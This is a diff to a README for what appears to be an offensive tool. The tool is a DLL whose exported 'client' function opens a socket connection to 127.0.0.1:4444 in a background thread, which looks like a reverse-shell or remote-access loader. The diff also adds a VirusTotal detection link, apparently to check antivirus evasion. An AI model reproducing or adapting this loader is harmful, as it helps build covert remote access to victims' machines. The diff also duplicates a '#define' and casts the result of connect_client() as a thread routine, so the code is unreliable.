@@ -18,9 +18,14 @@ int main()
 
 #define EXPORT _declspec(dllexport)
 
+#include "client_sock.h"
+
+#define EXPORT _declspec(dllexport)
+
 extern "C" EXPORT void client()
 {
-	Client client("127.0.0.1", 4444); //ip:port
+	Client* start = new Client("127.0.0.1", 4444);
+	CreateThread(0, 0, LPTHREAD_START_ROUTINE(start->connect_client()), 0, 0, 0);
 }
 ```
 # Dll startup:
@@ -63,6 +68,5 @@ section '.idata' import data readable
         import msvcrt,\
                printf, 'printf'
 ```
-#### Or in C++:
-
-Coming soon :)
+#Virus total check:
+https://www.virustotal.com/gui/file/17744a6ca38587e82bd49790566a9fb10cedebd4a9d62b59ef8661540f75378b/detection
